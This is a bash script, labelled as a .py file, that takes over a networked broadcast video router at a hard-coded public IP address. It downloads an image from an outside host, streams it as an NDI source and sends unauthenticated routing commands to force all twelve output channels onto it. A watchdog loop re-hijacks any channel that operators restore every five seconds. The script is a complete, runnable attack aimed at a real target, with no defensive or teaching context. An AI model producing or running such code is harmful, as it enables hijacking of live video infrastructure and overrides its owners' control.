#!/bin/bash
# NDI_HIJACK_FFMPEG_TRUSTED.py - FULL AUTO con WATCHDOG

# Config
VIDEOHUB_IP="66.44.213.48"
VIDEOHUB_PORT=9990
NDI_NAME="TRUSTEDF57"
PNG_URL="https://i.postimg.cc/tJq1ZFH3/pat.png"
NDI_INPUT=12  # Input NDI Videohub

# Download PNG
echo "[+] Downloading payload PNG..."
wget -O pat.png "$PNG_URL" || curl -L -o pat.png "$PNG_URL"

echo "[+] Starting NDI stream TRUSTEDF57 (1080p60 loop)..."
# FFMPEG NDI esatto - BGRA + audio sync Videohub
ffmpeg -stream_loop -1 -re -i pat.png \
  -pix_fmt bgra -f lavfi -i anullsrc=r=48000:a=2:c=stereo:s=16 \
  -c:v libndi_newtek -r 60 -s 1920x1080 -b:v 50M -maxrate 50M \
  -pix_fmt bgra -ar 48000 -ac 2 -b:a 128k \
  "NDI|${NDI_NAME}" -listen 1 -loglevel error &
FFMPEG_PID=$!

sleep 3
echo "[+] NDI ${NDI_NAME} ACTIVE - Hijacking ALL 12 channels..."

# HIJACK iniziale TUTTI i canali
for CH in {0..11}; do
    echo -e "OUT ${CH} ${NDI_INPUT}" | nc ${VIDEOHUB_IP} ${VIDEOHUB_PORT}
    echo "[+] HIJACK CH${CH} -> NDI:${NDI_INPUT}"
done

# WATCHDOG - Anti-restore ogni 5s
watchdog() {
    while kill -0 $FFMPEG_PID 2>/dev/null; do
        # Check routing table
        ROUTING=$(echo "VIDEO ROUTING" | nc ${VIDEOHUB_IP} ${VIDEOHUB_PORT} 2>/dev/null | grep "OUT " | head -5)
        
        # Re-hijack se qualcuno cambia
        for CH in {0..11}; do
            if ! echo "$ROUTING" | grep -q "OUT ${CH} ${NDI_INPUT}"; then
                echo -e "OUT ${CH} ${NDI_INPUT}" | nc ${VIDEOHUB_IP} ${VIDEOHUB_PORT}
                echo "[!] RESTORED CH${CH} -> TRUSTEDF57"
            fi
        done
        sleep 5
    done
}

watchdog &
WATCHDOG_PID=$!

echo "[+] FULL HIJACK ACTIVE - TRUSTEDF57 su TUTTI i 12 canali"
echo "[+] Watchdog anti-restore ON (Ctrl+C to stop)"
echo "[+] Monitor: vlc ndi://TRUSTEDF57"

# Trap per cleanup
trap "kill $FFMPEG_PID $WATCHDOG_PID; echo '[+] Stopped'; exit" INT TERM

wait $FFMPEG_PID
